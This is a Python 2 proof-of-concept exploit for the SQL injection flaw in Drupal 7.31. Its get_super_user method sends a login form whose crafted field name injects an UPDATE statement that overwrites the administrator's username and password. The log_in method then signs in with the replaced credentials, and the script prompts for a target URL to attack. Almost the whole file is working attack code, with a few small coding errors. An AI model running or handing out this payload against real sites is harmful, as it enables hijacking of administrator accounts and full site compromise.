#/usr/bin/env python
#-*- utf-8 -*-

#The Standard library
import subprocess
import re
# The third party library
import requests


class ProofOfConcept(object):
    """It's a Proof Of Concept for the SQL Injection Vulnerability of Drupal7.31"""
    
    def __init__(self, url="", username="", password=""):
        if username == "" and password == "":   #use default username and password
            self.username = "root" 
            self.unencrypt_password = "Helloknownsec"
            self.encrypt_password = subprocess.check_output(["php","get_encrypt_pass.php",self.unencrypt_password])
        else:                                   #use user difined username and password
            self.username = username
            try:
                self.unencrypt_password = password
                #use 'password.inc' to encrypt  password
                self.encrypt_password = subprocess.check_output(["php","get_encrypt_pass.php",self.unencrypt_password])
            except OsError,CalledProcessError:
                self.unencrypt_password = "Helloknownsec"
                self.encrypt_password = subprocess.check_output(["php","get_encrypt_pass.php",self.unencrypt_password])
                print "get encrypt password failed,use default password 'Helloknownsec'"
            
        if self.username and self.encrypt_password:
            print "your username is '%s',password is '%s'" % (self.username, self.unencrypt_password)
                    
        if url:           #check url 
            self.url = url
        else:
            print "Please input url which is you wanna attack:\n"
            tmp = raw_input()
            if tmp.find("http://") == 0:
                self.url = tmp
            else:
                print "Please input currect url"
        if url:
            print "your url is %s" % self.url        

        self.fill_word = "random"
        self.is_get_super_user = False
        self.is_log_in = False

    def _get_csrf_token(self):
        pattern = re.compile(r'name="form_build_id" value="(.+)"') 
        token_content = requests.get(url)
        form_build_id = pattern.findall(token_content.content)[0]
        return form_build_id

    def get_super_user(self):
        """
        This method can be used to replace the super username and password to yours
        """

        inject_sql_string1 = "name[test; update users set name='%s', pass='%s' where uid=1; --]" % (self.username, self.encrypt_password)
        inject_sql_string2 = "name[test]"
        update_data = {
            inject_sql_string1 : self.fill_word,
            inject_sql_string2 : self.fill_word,
            "pass" : self.fill_word,
            "form_build_id" : "",
            "form_id" : "user_login_block",
            "op" : "Log+in",
        }

        response  = requests.post(self.url, timeout=20, data=update_data)
        response_content = response.content
        if response_content.find("mb_strlen() expects parameter 1 to be string") != -1:
            print "Get super user successful!"
            self.is_get_super_user = True

    def log_in(self):
        """use covered username and password to log in """

        form_build_id = self._get_csrf_token()
        login_data = {
            'name' : self.username,
            'pass' : self.unencrypt_password,
            'form_build_id' : form_build_id,
            'form_id' : 'user_login_block',
            'op' : 'Log+in',
        }
        if self.get_super_user:
            log_in_content = requests.post(url, data=login_data)
            if log_in_content.content.find("Log out") != -1:
                self.is_log_in = True
                print "Log in successful"
            else:
                print "Log in failed"
        else:
            print "Please exec get_super_user"


if __name__ == "__main__":
    url = "http://127.0.0.1/"
    p = ProofOfConcept(url)
    p.get_super_user()
    p.log_in()
